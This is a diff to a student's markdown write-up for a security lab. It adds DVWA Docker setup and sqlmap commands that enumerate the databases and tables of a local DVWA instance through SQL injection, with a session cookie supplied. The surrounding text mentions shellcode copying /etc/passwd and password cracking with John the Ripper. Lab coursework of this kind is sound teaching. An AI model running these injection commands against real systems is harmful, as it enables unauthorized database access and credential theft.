@@ -192,8 +192,13 @@ After attacking, we see that the asm program copy /etc/passwd to /tmp/outfile, n
 - Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.
 ## Setup lab
 ### 1. Setup dwa
+
 ```
 git clone https://github.com/digininja/DVWA
+```
+Run Docker
+```
+docker-compose up -d
 ```
 ### 2. Setup sqlmap
 
@@ -209,6 +214,8 @@ git clone https://github.com/sqlmapproject/sqlmap
 ### 1. Login
 User : admin <br>
 Password: password <br>
+![image](https://github.com/user-attachments/assets/df50f280-f82f-43d4-8ba7-672297eeb16b)
+
 
 ### 2. Get cookies
 
@@ -218,6 +225,7 @@ Password: password <br>
 
 
 ### 3. Attack
+Use the command below to get information about all available databases
 
 ```
 python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" --dbs
@@ -229,6 +237,9 @@ python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=&Submit=Subm
 
 **Answer 2**:
 
+```
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" -D dvwa --tables
+```
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
 
